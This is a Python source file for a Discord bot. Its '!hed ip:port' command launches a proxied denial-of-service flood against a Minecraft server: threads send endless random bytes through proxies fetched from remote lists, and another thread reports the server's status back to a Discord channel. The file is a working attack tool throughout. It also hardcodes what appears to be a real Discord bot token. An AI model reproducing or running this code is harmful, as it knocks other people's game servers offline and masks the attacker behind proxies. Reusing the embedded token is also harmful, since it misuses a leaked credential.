import discord
import socket
import socks
import threading
import random
import time
import json
import requests
from mcstatus import MinecraftServer  # مكتبة للتحقق من حالة الخادم

# إعدادات بوت ديسكورد
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# تحميل البروكسيات من ملف Mejo.json
def load_proxies():
    proxies = []
    try:
        with open("Mejo.json", "r") as file:
            data = json.load(file)
            proxy_sources = data.get("Proxies", [])
            
            for source in proxy_sources:
                url = source.get("url")
                proxy_type = source.get("type")
                timeout = source.get("timeout", 5)

                # جلب البروكسيات من URL
                try:
                    response = requests.get(url, timeout=timeout)
                    if response.status_code == 200:
                        proxy_list = response.text.strip().split("\n")
                        for proxy in proxy_list:
                            proxies.append((proxy_type, proxy.strip()))
                except Exception as e:
                    print(f"Failed to fetch proxies from {url}: {e}")
    except Exception as e:
        print(f"Error loading Mejo.json: {e}")
    
    return proxies

# إعداد قائمة البروكسيات
proxies = load_proxies()

# دالة للهجوم باستخدام بروكسي
def attack_server(ip, port):
    try:
        proxy_type, proxy = random.choice(proxies)
        proxy_ip, proxy_port = proxy.split(":")
        
        s = socks.socksocket()
        if proxy_type == 1:  # HTTP
            s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
        elif proxy_type == 2:  # HTTPS
            s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
        elif proxy_type == 3:  # SOCKS4
            s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
        elif proxy_type == 4:  # SOCKS5
            s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        
        s.connect((ip, port))
        print(f"Bot connected to {ip}:{port} using proxy {proxy_ip}:{proxy_port}")

        while True:
            s.send(random._urandom(1024))
            time.sleep(0.1)

    except Exception as e:
        print(f"Connection failed: {e}")
    finally:
        s.close()
        print(f"Bot disconnected from {ip}:{port}")

# دالة لتشغيل الهجوم باستخدام عدة بوتات
def run_attack(ip, port, bots_count):
    print(f"Starting attack with {bots_count} bots on {ip}:{port}")
    for _ in range(bots_count):
        threading.Thread(target=attack_server, args=(ip, port)).start()

# دالة للتحقق من حالة الخادم
def check_server_status(ip, port, channel_id):
    channel = client.get_channel(channel_id)
    while True:
        try:
            server = MinecraftServer.lookup(f"{ip}:{port}")
            status = server.status()
            if status:
                message = f"🔵 الخادم {ip}:{port} متصل. عدد اللاعبين: {status.players.online}/{status.players.max}"
            else:
                message = f"🔴 الخادم {ip}:{port} غير متصل."
        except Exception as e:
            message = f"🔴 الخادم {ip}:{port} غير متصل."
        
        # إرسال الرسالة إلى القناة
        if channel:
            try:
                client.loop.create_task(channel.send(message))
            except Exception as e:
                print(f"Failed to send status message: {e}")

        time.sleep(3)  # الانتظار 3 ثواني قبل التحقق مرة أخرى

# حدث عندما يتلقى البوت رسالة
@client.event
async def on_message(message):
    global server_ip, server_port

    if message.author == client.user:
        return

    if message.content.startswith("!hed"):
        try:
            command, server_address = message.content.split()
            server_ip, server_port = server_address.split(":")
            server_port = int(server_port)

            channel_id = 1280552780859310100  # معرف القناة المطلوبة
            await message.channel.send(f"Starting attack on {server_ip}:{server_port}...")

            bots = 10
            run_attack(server_ip, server_port, bots)

            # بدء التحقق من حالة الخادم في Thread منفصل
            threading.Thread(target=check_server_status, args=(server_ip, server_port, channel_id)).start()

        except ValueError:
            await message.channel.send("Usage: !hed <server_ip:port>")

# تشغيل البوت
client.run('MTI2NjY1MDg4MzU0Mjg3NjIxMA.GWfzgd.XRyYMleBV1i58Fl4PpKkpD7dWq_4vMT4c-7RT0')